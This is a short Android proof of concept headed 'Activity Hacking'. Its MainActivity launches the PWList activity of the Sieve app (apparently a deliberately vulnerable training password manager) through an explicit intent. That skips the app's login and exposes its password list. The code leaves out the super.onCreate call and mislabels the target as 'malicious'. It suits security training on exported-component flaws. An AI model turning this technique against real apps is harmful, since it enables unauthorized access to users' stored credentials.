## Activity Hacking


**MainActivity.java**


```java
package com.example.myapplication;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        // 🔹 Launch malicious Activity explicitly
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.mwr.example.sieve",        // target package
                "com.mwr.example.sieve.PWList"  // target activity
        ));
        startActivity(intent);
    }
}
```
